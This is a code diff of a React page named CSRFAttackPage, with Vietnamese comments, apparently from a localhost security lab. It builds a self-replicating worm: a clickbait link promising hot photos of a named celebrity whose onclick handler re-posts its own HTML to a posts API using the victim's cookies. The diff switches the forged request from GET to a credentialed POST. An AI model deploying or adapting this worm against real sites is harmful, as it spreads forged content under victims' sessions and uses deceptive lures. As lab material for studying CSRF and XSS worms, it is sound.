@@ -5,22 +5,18 @@ const CSRFAttackPage = () => {
     e.preventDefault();
 
     // Tạo nội dung worm - chỉ tạo một post ban đầu
-    const wormContent = `     
-        <a href="#" onclick="fetch('http://localhost:5001/api/posts/create',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({content:this.outerHTML})})">Click để xem ảnh hot nhất của Ngọc Trinh!</a>
-          `;
+    const wormContent = `<a href="#" onclick="fetch('http://localhost:5001/api/posts/create',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({content:this.outerHTML})})">Click để xem ảnh hot nhất của Ngọc Trinh!</a>`;
 
     // Sử dụng fetch để gửi POST request
-    // fetch('http://localhost:5001/api/posts/create', {
-    //   method: 'POST',
-    //   credentials: 'include', // Cho phép gửi cookies
-    //   body: JSON.stringify({
-    //     content: wormContent,
-    //   }),
-    // })
-    // Sử dụng fetch để gửi GET request
-    fetch('http://localhost:5001/api/posts/create?content=' + encodeURIComponent(wormContent), {
-      method: 'GET',
+    fetch('http://localhost:5001/api/posts/create', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
       credentials: 'include', // Cho phép gửi cookies
+      body: JSON.stringify({
+        content: wormContent,
+      }),
     })
       .then((response) => response.json())
       .then((data) => {
